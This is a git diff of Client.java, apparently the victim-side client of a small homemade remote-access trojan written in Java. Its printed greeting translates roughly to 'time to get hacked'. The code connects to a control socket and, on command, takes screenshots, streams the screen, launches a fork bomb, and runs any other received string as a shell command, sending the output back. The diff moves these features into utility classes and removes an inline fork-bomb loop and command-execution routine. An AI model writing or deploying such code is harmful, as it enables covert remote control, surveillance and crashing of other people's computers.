@@ -1,13 +1,19 @@
 package main;
 
-import java.awt.*;
+import main.network.Connection;
+import main.network.Message;
+import main.utils.OsCheck;
+
+import java.awt.AWTException;
 import java.io.IOException;
 import java.net.Socket;
-import java.util.Scanner;
 
-import static main.ClientUtils.startOnNewThread;
-import static main.ScreenUtils.startScreenShare;
-import static main.ScreenUtils.stopScreenShare;
+import static main.utils.Bomb.explode;
+import static main.utils.ClientUtils.runTerminalCommand;
+import static main.utils.ClientUtils.sendCommandList;
+import static main.utils.ScreenUtils.sendScreenshot;
+import static main.utils.ScreenUtils.startScreenShare;
+import static main.utils.ScreenUtils.stopScreenShare;
 
 public class Client {
     static Connection connection;
@@ -16,7 +22,7 @@ public class Client {
     public static void main(String[] args) {
         try {
             System.out.println("Opa ta na hora de ser haskiado");
-            connection = new Connection(new Socket("localhost", 12345));
+            connection = new Connection(new Socket("localhost", 27015));
 
             MY_OS = OsCheck.getOperatingSystemType();
 
@@ -36,7 +42,7 @@ public class Client {
 
         switch (command) {
             case "screen":
-                ScreenUtils.sendScreenshot(connection, false);
+                sendScreenshot(connection, false);
                 break;
             case "start-screenshare":
                 startScreenShare(connection);
@@ -45,33 +51,13 @@ public class Client {
                 stopScreenShare();
                 break;
             case "bomb":
-                forkBomb();
+                explode(connection);
+                break;
+            case "help":
+                sendCommandList(connection);
+                break;
             default:
-                runTerminalCommand(MY_OS, command);
+                runTerminalCommand(MY_OS, command, connection);
         }
     }
-
-    private static void forkBomb() {
-        while (true)
-            startOnNewThread(new Bomb(connection));
-    }
-
-    private static void runTerminalCommand(OsCheck.OSType os, String command) throws IOException {
-        if (os.equals(OsCheck.OSType.Windows)) {
-            Runtime.getRuntime().exec("cmd /c cd C:\\");
-            command = "cmd /c" + command;
-        }
-
-        Process proc = Runtime.getRuntime().exec(command);
-        Scanner respostaDoComando = new Scanner(proc.getInputStream());
-
-        StringBuilder response = new StringBuilder();
-        while (respostaDoComando.hasNext()) {
-            response.append(respostaDoComando.nextLine() + "\n");
-        }
-        response.append("---------------------------------------");
-        connection.sendMessage(new Message("print", response.toString()));
-    }
-
-
 }
